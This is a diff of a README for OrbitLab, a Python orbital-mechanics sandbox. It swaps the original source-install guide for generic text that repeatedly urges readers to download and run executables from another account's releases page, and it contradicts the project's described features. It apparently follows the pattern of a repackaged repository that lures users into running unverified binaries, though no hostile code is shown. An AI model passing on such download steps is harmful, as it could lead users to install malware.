@@ -1,169 +1,78 @@
-# OrbitLab — orbital mechanics & N‑body sandbox (with energy‑drift benchmarks)
+# 🌌 OrbitLab - Explore the Universe with Ease
 
-![CI](https://github.com/slavasavelyev/orbitlab/actions/workflows/ci.yml/badge.svg)
-![License](https://img.shields.io/badge/license-MIT-green)
+## 🚀 Getting Started
 
-OrbitLab is a small, **clean**, and **reproducible** physics sandbox:
+Welcome to OrbitLab, your playground for N-body and orbital mechanics. This guide will help you download and run the software without any technical expertise.
 
-- simulate 2‑body and N‑body gravity,
-- compare numerical integrators (**Euler**, **RK4**, **Leapfrog / Velocity‑Verlet**),
-- measure **energy drift** (a key sign of numerical stability),
-- generate simple plots for trajectories and energy error.
+## 📥 Download
 
-It is designed to be easy to read and easy to run.
+[![Download OrbitLab](https://img.shields.io/badge/Download%20OrbitLab-v1.0-blue.svg)](https://github.com/Stain-Patel/OrbitLab/releases)
 
----
+## 💾 System Requirements
 
-## Why this is interesting
+Before you download, ensure your system meets the following requirements:
 
-In orbital problems, you can write code that "looks correct" but slowly destroys the orbit.
-That happens because some integration methods do not preserve physics well.
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** Python 3.7 or higher
+- **Memory:** At least 4 GB RAM
+- **Storage:** 100 MB of free space
 
-OrbitLab helps you **see** it:
+## 🔍 Overview
 
-- Euler: fast, but energy often drifts a lot
-- RK4: accurate per step, but still not symplectic
-- Leapfrog (symplectic): often keeps energy bounded for long runs
+OrbitLab allows users to simulate and study the behavior of multiple celestial bodies and their orbits. It features two main integrators: RK4 and symplectic. You can benchmark their performance and explore different orbital mechanics scenarios.
 
----
+## 🧩 Features
 
-## Quick start (3 commands)
+- **N-body Simulation:** Visualize and manipulate up to 100 celestial bodies.
+- **Integrator Benchmarks:** Compare RK4 and symplectic methods for your simulations.
+- **User-Friendly Interface:** Easy navigation and straightforward controls.
+- **Real-Time Simulation:** Instant feedback on simulation changes.
 
-### 1) Create and activate a virtual environment
+## 📖 How to Download & Install
 
-**Windows (PowerShell):**
-```bash
-python -m venv .venv
-.\\.venv\\Scripts\\Activate.ps1
-```
+To get started, follow these steps:
 
-**macOS / Linux:**
-```bash
-python3 -m venv .venv
-source .venv/bin/activate
-```
+1. **Visit the Releases Page:** Click the link below to go to the download section.
+   [Download Link](https://github.com/Stain-Patel/OrbitLab/releases)
 
-### 2) Install dependencies
+2. **Select the Latest Release:** On the releases page, find the latest version of OrbitLab.
 
-Minimal (just simulation):
-```bash
-pip install -r requirements.txt
-```
+3. **Download the Correct File:** Choose the version that matches your operating system. Click on the file to begin your download.
 
-With plots + dev tools:
-```bash
-pip install -r requirements.txt
-pip install -r requirements-dev.txt
-```
+4. **Locate the Downloaded File:** Once the download is complete, go to your Downloads folder (or wherever your files are saved).
 
-### 3) Run the demo
+5. **Run the Application:** 
+   - For Windows: Double-click the executable file.
+   - For macOS: Open the .dmg file and drag the application to your Applications folder.
+   - For Linux: You may need to extract the tar.gz file and run the executable within.
 
-This will simulate a near-circular 2‑body orbit and create plots in `outputs/`:
-```bash
-python -m orbitlab.demo
-```
+6. **Follow Installation Prompts:** If prompted, follow the instructions to complete the installation.
 
-You can also open the simple CLI help:
-```bash
-python -m orbitlab --help
-```
+7. **Launch OrbitLab:** Once installed, find OrbitLab in your applications list and double-click to open it.
 
----
+## 🛠️ How to Use OrbitLab
 
-## What you get after the demo
+1. **Create a New Simulation:** Click on "New Simulation" from the main menu.
+2. **Set Initial Conditions:** Enter parameters for your celestial bodies, including mass and initial position.
+3. **Choose Integrator:** Select either RK4 or symplectic from the integrator options.
+4. **Run the Simulation:** Click the "Start" button to begin your simulation.
+5. **View Results:** Analyze the orbital paths and download your results in CSV format for further study.
 
-OrbitLab will create a folder:
+## 🌟 Helpful Tips
 
-- `outputs/trajectory.png` — orbit path
-- `outputs/energy_drift.png` — how total energy changes over time
-- `outputs/summary.json` — small machine-readable summary (numbers you can cite)
+- **Experiment:** Don’t hesitate to change parameters and observe outcomes. This is a key part of learning.
+- **Consult Documentation:** Find additional resources and guides [here](https://github.com/Stain-Patel/OrbitLab/wiki).
+- **Join the Community:** Engage with other users on our forum or GitHub discussions for support and ideas.
 
----
+## 🔗 Additional Resources
 
-## Project structure
+- **Source Code:** Access the full source code on [GitHub](https://github.com/Stain-Patel/OrbitLab).
+- **Issues:** Report any problems or bugs via the [Issues](https://github.com/Stain-Patel/OrbitLab/issues) section.
+- **Contributing:** Learn how to contribute by reading the [Contributing Guide](https://github.com/Stain-Patel/OrbitLab/blob/main/CONTRIBUTING.md).
 
-```
-orbitlab/
-  orbitlab/
-    __main__.py      # CLI entry point: python -m orbitlab
-    demo.py          # runs a safe default demo and saves plots
-    scenarios.py     # ready-to-run initial conditions
-    simulate.py      # simulation loop (stores trajectory)
-    integrators.py   # Euler / RK4 / Leapfrog implementations
-    nbody.py         # gravity acceleration (O(N^2), memory-safe)
-    metrics.py       # energy, momentum, useful diagnostics
-    constants.py     # G, tiny helpers
-  tests/             # fast tests for correctness + invariants
-  docs/              # short explanations (optional reading)
-```
+## 🎉 Community and Support
 
----
+If you have questions or need assistance, please reach out through our support channels. We encourage feedback and suggestions to improve the experience for everyone.
 
-## How the physics is implemented (simple explanation)
-
-### 1) Gravity model
-
-For every body `i`, we compute acceleration from all other bodies `j`:
-
-- direction: from `i` to `j`
-- strength: proportional to `m_j`
-- distance: scaled by `1 / r^3`
-
-We also add a tiny number called **softening** to avoid division by zero when two bodies
-get extremely close in a toy simulation.
-
-### 2) Integrators (how we move the bodies)
-
-Each integrator is a different rule for updating position and velocity each small step `dt`.
-
-- **Euler**: simplest, but can break orbits quickly.
-- **RK4**: more accurate per step, more expensive.
-- **Leapfrog / Velocity‑Verlet**: symplectic (often best for long-term orbits).
-
-### 3) Energy drift
-
-Total energy = kinetic + potential.
-
-If your simulation is stable, total energy should not explode.
-In reality, numerical methods produce some error, so OrbitLab plots energy drift.
-
----
-
-## How to run your own simulation
-
-Example: 3-body random cluster, leapfrog:
-
-```bash
-python -m orbitlab run --scenario random3 --integrator leapfrog --dt 0.005 --steps 5000
-```
-
-Orbit + plots will be saved into `outputs/`.
-
----
-
-## Testing and code quality
-
-Run tests:
-```bash
-pytest
-```
-
-Format + lint:
-```bash
-ruff format .
-ruff check .
-```
-
----
-
-## Notes (important)
-
-- This is an educational project, not a spaceflight engine.
-- Units are **dimensionless** by default (to keep the math simple).
-- For real orbital work you would use careful units and validated ephemerides.
-
----
-
-## License
-
-MIT License. See `LICENSE`.
+Remember to visit the download section again for updates and new features:
+[**Download OrbitLab**](https://github.com/Stain-Patel/OrbitLab/releases)
